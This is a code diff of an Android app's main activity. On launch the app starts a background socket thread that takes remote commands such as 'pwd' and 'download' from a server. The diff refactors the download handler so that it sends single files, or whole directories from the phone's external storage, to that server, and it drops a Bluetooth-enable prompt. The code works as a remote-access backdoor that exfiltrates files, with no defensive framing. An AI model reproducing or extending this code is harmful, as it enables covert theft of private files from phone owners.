@@ -42,9 +42,7 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        Intent enableBtIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);
-        startActivityForResult(enableBtIntent, 0);
-
+  
 
         connect thread = new connect();
         thread.start();
@@ -52,10 +50,9 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
+  class connect extends Thread {
 
-    class connect extends Thread {
-
-        String currentpath = "/storage/emulated/0";
+        String currentpath = Environment.getExternalStorageDirectory().toString();
 
         @RequiresApi(api = Build.VERSION_CODES.O)
         @Override
@@ -197,34 +194,50 @@ public class MainActivity extends AppCompatActivity {
             } else if (cmd.startsWith("pwd")) {
                 output = currentpath;
             } else if (cmd.startsWith("download ")) {
-                String file_to_download = currentpath + "/" + cmd.split("download ")[1];
-                File file = new File(file_to_download);
-                if (file.isDirectory()) {
-                    List<String> all_files = getallfiles(file);
-                    send(server, "dir");
-                    recv(server);
-                    send(server, "number_of_files: " + all_files.size());
-                    recv(server);
-                    for (String file1 : all_files){
-                        downloadfile(server, file1);
-                    }
-                }
-                else if (file.isFile()) {
 
-                    downloadfile(server, file_to_download);
-                    output = "file sent: " + cmd.split("download ")[1];
-                }
-                else if (!file.exists()){
-                    output = "file doesnt exist";
-                }
-                else {
-                    output = "unknown error";
-                }
-                recv(server);
-
+               output = download(server, cmd);
 
             }
             return output;
+        }
+
+        @RequiresApi(api = Build.VERSION_CODES.O)
+        String download(Socket server, String cmd){
+            String output = "null";
+
+            String file_to_download = currentpath + "/" + cmd.split("download ")[1];
+            File file = new File(file_to_download);
+
+
+
+            if (file.isDirectory()) {
+                List<String> all_files = getallfiles(file);
+                send(server, "dir");
+                recv(server);
+                send(server, "number_of_files: " + all_files.size());
+                recv(server);
+                for (String file1 : all_files){
+
+                    downloadfile(server, file_to_download + "/" + file1);
+                    recv(server);
+                    send(server, "done downloading " + file1);
+                }
+            }
+            else if (file.isFile()) {
+                send(server, "file");
+                downloadfile(server, file_to_download);
+                output = "file sent: " + cmd.split("download ")[1];
+                recv(server);
+            }
+            else if (!file.exists()){
+                output = "file doesnt exist";
+            }
+            else {
+                output = "unknown error";
+            }
+
+            return output;
+
         }
 
         @RequiresApi(api = Build.VERSION_CODES.O)
